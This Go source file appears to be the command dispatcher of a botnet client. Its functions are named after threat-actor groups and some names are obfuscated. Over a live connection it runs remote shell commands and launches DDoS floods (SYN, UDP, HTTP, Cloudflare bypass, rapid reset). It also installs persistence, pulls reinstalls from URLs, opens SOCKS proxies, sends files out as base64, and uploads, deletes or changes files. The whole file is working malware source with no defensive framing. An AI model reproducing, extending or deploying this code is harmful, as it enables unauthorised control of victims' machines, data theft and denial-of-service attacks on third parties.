package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
)

// blackEnergy is the main command dispatcher.
// Attack and SOCKS cases delegate to dispatchAttack / dispatchSocks, which are
// defined in attacks.go (withattacks build tag) or attacks_stub.go (!withattacks),
// and socks.go (withsocks) or socks_stub.go (!withsocks).
// When those files are excluded by build tags the stub returns an error and the
// binary contains zero attack/socks code.
func blackEnergy(conn net.Conn, command string) error {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return fmt.Errorf("empty command")
	}
	cmd := fields[0]
	switch cmd {
	case "!shell", "!exec":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !shell <command>")
		}
		output, err := sidewinder(strings.Join(fields[1:], " "))
		if err != nil {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
		} else {
			encoded := base64.StdEncoding.EncodeToString([]byte(output))
			conn.Write([]byte(fmt.Sprintf(protoOutFmt, encoded)))
		}
		return nil
	case "!stream":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !stream <command>")
		}
		go machete(strings.Join(fields[1:], " "), conn)
		conn.Write([]byte(msgStreamStart))
		return nil
	case "!detach", "!bg":
		if len(fields) < 2 {
			return fmt.Errorf("usage: !detach <command>")
		}
		oceanLotus(strings.Join(fields[1:], " "))
		conn.Write([]byte(msgBgStart))
		return nil
	case "!stop":
		dispatchAttackStop()
		return nil
	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns", "!https", "!tls", "!cfbypass", "!rapidreset":
		return dispatchAttack(conn, cmd, fields)
	case "!persist":
		url := ""
		if len(fields) >= 2 {
			url = fields[1]
		}
		go fVxMqKp(url)
		conn.Write([]byte(msgPersistStart))
	case "!reinstall":
		if len(fields) < 2 {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !reinstall <url>")))
			return nil
		}
		go cTwHnYz(fields[1])
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "Reinstall initiated: "+fields[1])))
	case "!kill":
		conn.Write([]byte(msgKillAck))
		rZbQfGv()
	case "!info":
		hostname, _ := os.Hostname()
		arch := charmingKitten()
		info := fmt.Sprintf("Hostname: %s\nArch: %s\nBotID: %s\nOS: %s\n", hostname, arch, mustangPanda(), runtime.GOOS)
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, info)))
	case "!socks", "!stopsocks", "!socksauth":
		return dispatchSocks(conn, cmd, fields)
	case "!download":
		if len(fields) < 2 {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !download <path>")))
			return nil
		}
		path := fields[1]
		data, err := os.ReadFile(path)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
			return nil
		}
		if len(data) > 10*1024*1024 {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "file too large (>10MB)")))
			return nil
		}
		b64data := base64.StdEncoding.EncodeToString(data)
		conn.Write([]byte("__FILE_START__" + filepath.Base(path) + "\n" + b64data + "\n__FILE_END__\n"))
		return nil
	case "!upload":
		if len(fields) < 3 {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !upload <path> <base64data>")))
			return nil
		}
		path := fields[1]
		decoded, err := base64.StdEncoding.DecodeString(strings.Join(fields[2:], ""))
		if err != nil {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "base64 decode failed: "+err.Error())))
			return nil
		}
		if err := os.WriteFile(path, decoded, 0644); err != nil {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
			return nil
		}
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fmt.Sprintf("wrote %d bytes to %s", len(decoded), path))))
		return nil
	case "!rm":
		if len(fields) < 2 {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !rm <path>")))
			return nil
		}
		if err := os.Remove(fields[1]); err != nil {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
		} else {
			conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "removed: "+fields[1])))
		}
		return nil
	case "!mv":
		if len(fields) < 3 {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !mv <src> <dst>")))
			return nil
		}
		if err := os.Rename(fields[1], fields[2]); err != nil {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
		} else {
			conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fields[1]+" -> "+fields[2])))
		}
		return nil
	case "!chmod":
		if len(fields) < 3 {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !chmod <octal-mode> <path>")))
			return nil
		}
		mode, err := strconv.ParseUint(fields[1], 8, 32)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "invalid mode: "+fields[1])))
			return nil
		}
		if err := os.Chmod(fields[2], os.FileMode(mode)); err != nil {
			conn.Write([]byte(fmt.Sprintf(protoErrFmt, err)))
		} else {
			conn.Write([]byte(fmt.Sprintf(protoInfoFmt, fmt.Sprintf("chmod %s %s: ok", fields[1], fields[2]))))
		}
		return nil
	default:
		return fmt.Errorf("unknown command")
	}
	return nil
}
